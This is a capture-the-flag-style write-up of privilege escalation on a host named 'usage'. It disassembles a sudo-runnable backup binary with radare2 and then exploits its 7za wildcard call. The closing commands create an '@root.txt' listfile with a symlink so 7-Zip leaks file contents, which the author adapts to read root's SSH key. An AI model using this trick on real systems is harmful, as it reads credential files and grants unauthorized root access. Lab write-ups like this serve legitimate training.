The script opens with 3 options:

- create project backup
- create db backup 
- reset admin password 

## Create project backup 

The backup uses 7zip to create a compressed backup in /var/backups/projects.zip.  After getting the zip the contents where the /var/www/html/ directory (subdirectories included).

```bash
xander@usage:~$ sudo /usr/bin/usage_management 
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17968 files, 113883558 bytes (109 MiB)                      

Creating archive: /var/backups/project.zip

Items to compress: 20952

                                                                               
Files read from disk: 17968
Archive size: 54839716 bytes (53 MiB)
Everything is Ok

```

Other options at first seemed to do noting (at least i got no output )
## Analysing code 

In my case i decided to use redare2 to get the job done 

```bash
┌──(root㉿kali)-[/home/kali]
└─# file usage_management 
usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
```

**compress website** 

```asm
[0x000011e9]> pdf
            ; CALL XREF from main @ 0x12f0(x)
┌ 62: sym.backupWebContent ();
│           0x000011e9      f30f1efa       endbr64
│           0x000011ed      55             push rbp
│           0x000011ee      4889e5         mov rbp, rsp
│           0x000011f1      488d05100e..   lea rax, str._var_www_html  ; 0x2008 ; "/var/www/html"
│           0x000011f8      4889c7         mov rdi, rax
│           0x000011fb      e8b0feffff     call sym.imp.chdir
│           0x00001200      85c0           test eax, eax
│       ┌─< 0x00001202      7511           jne 0x1215
│       │   0x00001204      488d050d0e..   lea rax, str._usr_bin_7za_a__var_backups_project.zip__tzip__snl__mmt____ ; 0x2018 ; "/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *"
│       │   0x0000120b      4889c7         mov rdi, rax                ; const char *string
│       │   0x0000120e      e8adfeffff     call sym.imp.system         ; int system(const char *string)
│      ┌──< 0x00001213      eb0f           jmp 0x1224
│      ││   ; CODE XREF from sym.backupWebContent @ 0x1202(x)
│      │└─> 0x00001215      488d053c0e..   lea rax, str.Error_changing_working_directory_to__var_www_html ; 0x2058 ; "Error changing working directory to /var/www/html"
│      │    0x0000121c      4889c7         mov rdi, rax                ; const char *s
│      │    0x0000121f      e8bcfeffff     call sym.imp.perror         ; void perror(const char *s)
│      │    ; CODE XREF from sym.backupWebContent @ 0x1213(x)
│      └──> 0x00001224      90             nop
│           0x00001225      5d             pop rbp
└           0x00001226      c3             ret

```

**compress database**

```asm 
            ; CALL XREF from main @ 0x12fc(x)
┌ 26: sym.backupMysqlData ();
│           0x00001227      f30f1efa       endbr64
│           0x0000122b      55             push rbp
│           0x0000122c      4889e5         mov rbp, rsp
│           0x0000122f      488d055a0e..   lea rax, str._usr_bin_mysqldump__A____var_backups_mysql_backup.sql ; 0x2090 ; "/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql"
│           0x00001236      4889c7         mov rdi, rax                ; const char *string
│           0x00001239      e882feffff     call sym.imp.system         ; int system(const char *string)
│           0x0000123e      90             nop
│           0x0000123f      5d             pop rbp
└           0x00001240      c3             ret

```

**password reset**

```asm
            ; CALL XREF from main @ 0x1308(x)
┌ 26: sym.resetAdminPassword ();
│           0x00001241      f30f1efa       endbr64
│           0x00001245      55             push rbp
│           0x00001246      4889e5         mov rbp, rsp
│           0x00001249      488d05760e..   lea rax, str.Password_has_been_reset. ; 0x20c6 ; "Password has been reset."
│           0x00001250      4889c7         mov rdi, rax                ; const char *s
│           0x00001253      e848feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00001258      90             nop
│           0x00001259      5d             pop rbp
└           0x0000125a      c3             ret
```

**main**

```asm
[0x0000125b]> pdf
            ; DATA XREF from entry0 @ 0x1118(r)
┌ 203: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_4h @ rbp-0x4
│           0x0000125b      f30f1efa       endbr64
│           0x0000125f      55             push rbp
│           0x00001260      4889e5         mov rbp, rsp
│           0x00001263      4883ec10       sub rsp, 0x10
│           0x00001267      488d05710e..   lea rax, str.Choose_an_option: ; 0x20df ; "Choose an option:"
│           0x0000126e      4889c7         mov rdi, rax                ; const char *s
│           0x00001271      e82afeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00001276      488d05740e..   lea rax, str.1._Project_Backup ; 0x20f1 ; "1. Project Backup"
│           0x0000127d      4889c7         mov rdi, rax                ; const char *s
│           0x00001280      e81bfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00001285      488d05770e..   lea rax, str.2._Backup_MySQL_data ; 0x2103 ; "2. Backup MySQL data"
│           0x0000128c      4889c7         mov rdi, rax                ; const char *s
│           0x0000128f      e80cfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00001294      488d057d0e..   lea rax, str.3._Reset_admin_password ; 0x2118 ; "3. Reset admin password"
│           0x0000129b      4889c7         mov rdi, rax                ; const char *s
│           0x0000129e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000012a3      488d05860e..   lea rax, str.Enter_your_choice__1_2_3_: ; 0x2130 ; "Enter your choice (1/2/3): "
│           0x000012aa      4889c7         mov rdi, rax                ; const char *format
│           0x000012ad      b800000000     mov eax, 0
│           0x000012b2      e819feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000012b7      488d45fc       lea rax, [var_4h]
│           0x000012bb      4889c6         mov rsi, rax
│           0x000012be      488d05870e..   lea rax, [0x0000214c]       ; "%d"
│           0x000012c5      4889c7         mov rdi, rax                ; const char *format
│           0x000012c8      b800000000     mov eax, 0
│           0x000012cd      e81efeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x000012d2      8b45fc         mov eax, dword [var_4h]
│           0x000012d5      83f803         cmp eax, 3
│       ┌─< 0x000012d8      7429           je 0x1303
│       │   0x000012da      83f803         cmp eax, 3
│      ┌──< 0x000012dd      7f30           jg 0x130f
│      ││   0x000012df      83f801         cmp eax, 1
│     ┌───< 0x000012e2      7407           je 0x12eb
│     │││   0x000012e4      83f802         cmp eax, 2
│    ┌────< 0x000012e7      740e           je 0x12f7
│   ┌─────< 0x000012e9      eb24           jmp 0x130f
│   │││││   ; CODE XREF from main @ 0x12e2(x)
│   ││└───> 0x000012eb      b800000000     mov eax, 0
│   ││ ││   0x000012f0      e8f4feffff     call sym.backupWebContent
│   ││┌───< 0x000012f5      eb28           jmp 0x131f
│   │││││   ; CODE XREF from main @ 0x12e7(x)
│   │└────> 0x000012f7      b800000000     mov eax, 0
│   │ │││   0x000012fc      e826ffffff     call sym.backupMysqlData
│   │┌────< 0x00001301      eb1c           jmp 0x131f
│   │││││   ; CODE XREF from main @ 0x12d8(x)
│   ││││└─> 0x00001303      b800000000     mov eax, 0
│   ││││    0x00001308      e834ffffff     call sym.resetAdminPassword
│   ││││┌─< 0x0000130d      eb10           jmp 0x131f
│   │││││   ; CODE XREFS from main @ 0x12dd(x), 0x12e9(x)
│   └──└──> 0x0000130f      488d05390e..   lea rax, str.Invalid_choice. ; 0x214f ; "Invalid choice."
│    ││ │   0x00001316      4889c7         mov rdi, rax                ; const char *s
│    ││ │   0x00001319      e882fdffff     call sym.imp.puts           ; int puts(const char *s)
│    ││ │   0x0000131e      90             nop
│    ││ │   ; CODE XREFS from main @ 0x12f5(x), 0x1301(x), 0x130d(x)
│    └└─└─> 0x0000131f      b800000000     mov eax, 0
│           0x00001324      c9             leave
└           0x00001325      c3             ret
```


- No overflow found at the start

Turns out there is a trick to this, which i found in hacktricks, consisting of using the following commands 

```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

It will dump in an error the contents of of a file in several messages.

In this case it was adapted to read the .ssh file and get a root login, thus we are now [[root]]